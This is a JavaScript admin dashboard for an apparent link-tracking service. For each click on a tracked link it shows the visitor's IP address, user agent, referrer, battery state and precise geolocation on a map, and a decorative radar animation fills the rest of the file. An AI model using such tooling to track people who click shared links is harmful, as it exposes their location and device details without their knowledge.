let map;
let marker;

function initMap(lat, lon) {
  if (!map) {
    map = L.map('map').setView([lat || 0, lon || 0], lat ? 13 : 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap contributors' }).addTo(map);
  }
  if (lat && lon) {
    if (marker) marker.setLatLng([lat, lon]); else marker = L.marker([lat, lon]).addTo(map);
    map.setView([lat, lon], 13);
  }
}

const isLocalDevServer = location.protocol === 'file:' || (['localhost', '127.0.0.1', '0.0.0.0'].includes(location.hostname) && location.port && location.port !== '3000');
const API_BASE = isLocalDevServer ? 'http://localhost:3000' : '';

function getQueryParam(name) {
  return new URLSearchParams(window.location.search).get(name);
}

document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('viewForm');
  const viewId = document.getElementById('viewId');
  const result = document.getElementById('result');
  const linkTarget = document.getElementById('linkTarget');
  const createdAt = document.getElementById('createdAt');
  const deviceInfo = document.getElementById('deviceInfo');
  const clicksList = document.getElementById('clicks');
  const deleteBtn = document.getElementById('deleteLinkBtn');

  async function loadAdminLink(id) {
    const res = await fetch(`${API_BASE}/api/admin?id=${encodeURIComponent(id)}`);
    if (!res.ok) {
      alert('Not found');
      return;
    }

    const data = await res.json();
    result.classList.remove('hidden');
    viewId.value = id;
    linkTarget.textContent = data.link.target;
    createdAt.textContent = data.link.createdAt;
    clicksList.innerHTML = '';
    deviceInfo.innerHTML = '<p>No client details available.</p>';

    const formatLocation = (location) => {
      if (!location || typeof location.latitude !== 'number' || typeof location.longitude !== 'number') return 'Not available';
      const accuracy = location.accuracy != null ? ` ±${location.accuracy}m` : '';
      return `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}${accuracy}`;
    };

    let foundCoords = null;
    const allClicks = data.clicks || [];
    if (!allClicks.length) {
      const emptyLi = document.createElement('li');
      emptyLi.className = 'clickCard';
      emptyLi.innerHTML = '<p>No clicks recorded yet for this link.</p>';
      clicksList.appendChild(emptyLi);
    } else {
      allClicks.forEach(c => {
        const li = document.createElement('li');
        li.className = 'clickCard';

        const when = document.createElement('div');
        when.className = 'clickTime';
        when.textContent = c.at || 'Unknown timestamp';

        const meta = document.createElement('div');
        meta.className = 'clickMeta';
        meta.innerHTML = `
          <div><strong>IP:</strong> ${c.ip || 'Unknown'}</div>
          <div><strong>UA:</strong> ${c.ua || c.client?.ua || 'Unknown'}</div>
          <div><strong>Referrer:</strong> ${c.ref || '-'}</div>
        `;

        li.appendChild(when);
        li.appendChild(meta);

        if (c.client) {
          const clientInfo = document.createElement('div');
          clientInfo.className = 'clickClient';
          const batteryText = c.client.battery ? `${Math.round((c.client.battery.level || 0) * 100)}% ${c.client.battery.charging ? '(charging)' : '(not charging)'}` : 'Not available';
          const locationText = formatLocation(c.client.location);

          clientInfo.innerHTML = `
            <div><strong>Battery:</strong> ${batteryText}</div>
            <div><strong>Location:</strong> ${locationText}</div>
          `;
          li.appendChild(clientInfo);

          if (c.client.location && !foundCoords) {
            foundCoords = c.client.location;
          }
        }

        clicksList.appendChild(li);
      });
    }

    if (allClicks.length) {
      const latestClientClick = allClicks.slice().reverse().find(c => c.client);
      if (latestClientClick) {
        const batteryText = latestClientClick.client.battery ? `${Math.round((latestClientClick.client.battery.level || 0) * 100)}% ${latestClientClick.client.battery.charging ? '(charging)' : '(not charging)'}` : 'Not available';
        const locationText = formatLocation(latestClientClick.client.location);
        deviceInfo.innerHTML = `
          <p><strong>Latest client:</strong> ${latestClientClick.client.ua || 'Unknown'}</p>
          <p><strong>Battery:</strong> ${batteryText}</p>
          <p><strong>Location:</strong> ${locationText}</p>
        `;
      }
    }

    initMap(foundCoords?.latitude, foundCoords?.longitude);
    if (deleteBtn) {
      deleteBtn.onclick = async () => {
        if (!confirm('Delete this link and its history?')) return;
        const res = await fetch(`${API_BASE}/api/delete?id=${encodeURIComponent(id)}`, { method: 'DELETE' });
        if (res.ok) { alert('Deleted'); result.classList.add('hidden'); } else alert('Failed to delete');
      };
    }
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const id = viewId.value.trim();
    if (!id) return;
    await loadAdminLink(id);
  });

  const initialId = new URLSearchParams(window.location.search).get('id');
  if (initialId) {
    loadAdminLink(initialId);
  }
});

/* ------- embed radar animation (copied from main.js) ------- */
const radarCanvas = document.getElementById('radar');
if (radarCanvas) {
  const radarCtx = radarCanvas.getContext('2d');
  function resizeRadar(){ const rect = radarCanvas.getBoundingClientRect(); const size=Math.floor(Math.min(rect.width,rect.height)); radarCanvas.width=size; radarCanvas.height=size; }
  window.addEventListener('resize', resizeRadar); resizeRadar();

  const mapImg = new Image(); mapImg.crossOrigin='anonymous'; mapImg.src='https://upload.wikimedia.org/wikipedia/commons/8/83/Equirectangular_projection_SW.jpg'; let mapReady=false; mapImg.onload=()=>mapReady=true;
  const NUM_TARGETS=8; let targets=[]; function initTargets(){targets=[]; for(let i=0;i<NUM_TARGETS;i++){targets.push({angle:Math.random()*360,radius:0.25+Math.random()*0.6,speed:(Math.random()*0.12-0.02),heading:Math.random()*360,hit:0.35+Math.random()*0.1,id:'T'+i});}} initTargets();
  let sweepAngle=0; const SWEEP_SPEED=0.9;
  function drawRadar(){ const w=radarCanvas.width,h=radarCanvas.height,cx=w/2,cy=h/2,R=Math.min(w,h)/2-6,beamWidth=34; radarCtx.clearRect(0,0,w,h); radarCtx.save(); radarCtx.translate(cx,cy); radarCtx.beginPath(); radarCtx.arc(0,0,R,0,Math.PI*2); radarCtx.clip(); radarCtx.fillStyle='rgba(1,15,9,0.22)'; radarCtx.fillRect(-R,-R,R*2,R*2);
    if(mapReady){ const iw=mapImg.naturalWidth, ih=mapImg.naturalHeight, boxSize=R*2, scale=Math.max(boxSize/iw,boxSize/ih)*1.02, dw=iw*scale, dh=ih*scale, dx=-dw/2, dy=-dh/2 - boxSize*0.05; radarCtx.filter='grayscale(1) brightness(0.9) sepia(1) hue-rotate(72deg) saturate(5) contrast(1.1)'; radarCtx.globalAlpha=0.55; radarCtx.drawImage(mapImg,dx,dy,dw,dh); radarCtx.filter='none'; radarCtx.globalAlpha=1; const vignette=radarCtx.createRadialGradient(0,0,R*0.25,0,0,R); vignette.addColorStop(0,'rgba(1,15,9,0)'); vignette.addColorStop(1,'rgba(1,15,9,0.6)'); radarCtx.fillStyle=vignette; radarCtx.fillRect(-R,-R,R*2,R*2);} 
    radarCtx.lineWidth=1; for(let r=1;r<=6;r++){ radarCtx.strokeStyle=(r%2===0)?'rgba(56,189,248,0.28)':'rgba(56,189,248,0.12)'; radarCtx.beginPath(); radarCtx.arc(0,0,R*r/6,0,Math.PI*2); radarCtx.stroke(); }
    for(let a=0;a<360;a+=30){ const rad=a*Math.PI/180; radarCtx.strokeStyle='rgba(56,189,248,0.12)'; radarCtx.lineWidth=1; radarCtx.beginPath(); radarCtx.moveTo(0,0); radarCtx.lineTo(R*Math.sin(rad), -R*Math.cos(rad)); radarCtx.stroke(); }
    const sweepRad = sweepAngle*Math.PI/180; radarCtx.save(); radarCtx.beginPath(); radarCtx.moveTo(0,0); const a0=sweepRad-beamWidth*Math.PI/180, a1=sweepRad; radarCtx.arc(0,0,R, a0 - Math.PI/2, a1 - Math.PI/2, false); radarCtx.closePath(); const wedgeGrad = radarCtx.createLinearGradient(R*Math.sin(a0), -R*Math.cos(a0), R*Math.sin(a1), -R*Math.cos(a1)); wedgeGrad.addColorStop(0,'rgba(125,255,240,0)'); wedgeGrad.addColorStop(1,'rgba(125,255,240,0.55)'); radarCtx.fillStyle=wedgeGrad; radarCtx.fill(); radarCtx.restore(); radarCtx.save(); radarCtx.strokeStyle='rgba(200,255,240,0.95)'; radarCtx.lineWidth=2; radarCtx.shadowColor='#9dfff0'; radarCtx.shadowBlur=10; radarCtx.beginPath(); radarCtx.moveTo(0,0); radarCtx.lineTo(R*Math.sin(sweepRad), -R*Math.cos(sweepRad)); radarCtx.stroke(); radarCtx.restore();
    targets.forEach(t=>{ t.radius += t.speed*0.0015; if(t.radius>0.95) t.radius=0.95; if(t.radius<0.15) t.radius=0.15; t.angle=(t.angle+0.02)%360; const d=Math.abs(((t.angle-sweepAngle+540)%360)-180); const active = d < beamWidth; t.hit = active?1:Math.max(0.35,t.hit*0.985); const rad = t.angle*Math.PI/180; const px = R*t.radius*Math.sin(rad); const py = -R*t.radius*Math.cos(rad); radarCtx.save(); radarCtx.translate(px,py); radarCtx.rotate(rad + t.heading*Math.PI/180*0.15); radarCtx.fillStyle = `rgba(230,255,240,${t.hit})`; radarCtx.shadowColor='rgba(125,255,200,0.9)'; radarCtx.shadowBlur = 8 * t.hit; radarCtx.beginPath(); radarCtx.moveTo(0,-6); radarCtx.lineTo(4,5); radarCtx.lineTo(0,2); radarCtx.lineTo(-4,5); radarCtx.closePath(); radarCtx.fill(); radarCtx.restore(); });
    radarCtx.fillStyle='rgba(56,255,220,0.9)'; radarCtx.beginPath(); radarCtx.arc(0,0,3,0,Math.PI*2); radarCtx.fill(); radarCtx.restore(); radarCtx.strokeStyle='rgba(56,189,248,0.85)'; radarCtx.lineWidth=2.5; radarCtx.shadowColor='rgba(56,189,248,0.6)'; radarCtx.shadowBlur=6; radarCtx.beginPath(); radarCtx.arc(cx,cy,R,0,Math.PI*2); radarCtx.stroke(); radarCtx.shadowBlur=0; radarCtx.fillStyle='rgba(200,255,225,0.85)'; radarCtx.font='9px Courier New'; radarCtx.textAlign='center'; radarCtx.textBaseline='middle'; for(let a=0;a<360;a+=30){ const rad=a*Math.PI/180; const lx=cx+(R+13)*Math.sin(rad); const ly=cy-(R+13)*Math.cos(rad); radarCtx.fillText(String(a).padStart(3,'0'),lx,ly); }
    sweepAngle = (sweepAngle + SWEEP_SPEED) % 360; document.getElementById('sweepBrg') && (document.getElementById('sweepBrg').textContent = String(Math.round(sweepAngle)).padStart(3,'0')); document.getElementById('trackCount') && (document.getElementById('trackCount').textContent = targets.length);
    requestAnimationFrame(drawRadar);
  }
  drawRadar();
  function tickClock(){ const now=new Date(); const el=document.getElementById('clock'); if(el) el.textContent=[now.getUTCHours(),now.getUTCMinutes(),now.getUTCSeconds()].map(v=>String(v).padStart(2,'0')).join(':'); }
  setInterval(tickClock,1000); tickClock();
  const pixelGrid = document.getElementById('pixelGrid'); const pixelCells=[]; if(pixelGrid){ for(let i=0;i<30;i++){ const d=document.createElement('div'); pixelGrid.appendChild(d); pixelCells.push(d);} function flicker(){ pixelCells.forEach(c=>{ const lit=Math.random()<0.35; c.style.background=lit?'rgba(56,255,220,0.8)':'rgba(56,255,220,0.10)'; c.style.boxShadow=lit?'0 0 5px rgba(56,255,220,0.8)':'none'; }); } setInterval(flicker,500); flicker(); }
  const eqLeft = document.getElementById('eqLeft'); const eqRight = document.getElementById('eqRight'); const spectrum = document.getElementById('spectrum'); function buildBars(container,count){ const arr=[]; if(!container) return arr; for(let i=0;i<count;i++){ const d=document.createElement('div'); container.appendChild(d); arr.push(d);} return arr; }
  const leftBars = buildBars(eqLeft,8); const rightBars = buildBars(eqRight,8); const specBars = buildBars(spectrum,40);
  function animateBars(bars){ bars.forEach(b=>{ b.style.height = (10 + Math.random()*90) + '%'; }); }
  setInterval(()=>{ animateBars(leftBars); animateBars(rightBars); animateBars(specBars); },220);
}
